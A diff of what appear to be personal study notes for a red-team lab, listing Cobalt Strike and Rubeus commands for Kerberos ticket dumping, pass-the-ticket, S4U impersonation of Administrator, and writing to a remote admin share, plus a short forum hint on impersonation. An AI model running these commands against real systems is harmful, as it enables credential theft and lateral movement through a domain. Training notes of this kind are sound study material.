@@ -1,4 +1,13 @@
+# Misc
 
+```
+make_token CONTOSO\user FakePass
+
+$ticket = "doIFo[...snip...]kNPTQ=="
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String($ticket))
+
+kerberos_ticket_use C:\Users\Attacker\Desktop\ticket.kirbi
+```
 # Session Passing
 
 ## spawn
@@ -85,13 +94,6 @@ krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]
 
 krb_dump /luid:3e7 /service:krbtgt
 
-make_token CONTOSO\user FakePass
-
-$ticket = "doIFo[...snip...]kNPTQ=="
-[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String($ticket))
-
-kerberos_ticket_use C:\Users\Attacker\Desktop\ticket.kirbi
-
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=
 
 krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
@@ -107,6 +109,9 @@ shell copy C:\rto.txt \\lon-ws-1\C$\rto.txt
 ```
 
 Ou alors mouvement latéral sur la machine et écriture depuis CS avec File browser -> upload
+
+> I'm always reaching the last host but cannot write to it even with cifs ticket. Can i get a hint in what to sudy again?
+> "even with cifs ticket" doesn't make too much sense. What's important is the user that you're impersonating with that ticket. Not all tickets are equal.
 
 ---
 # MSSQL
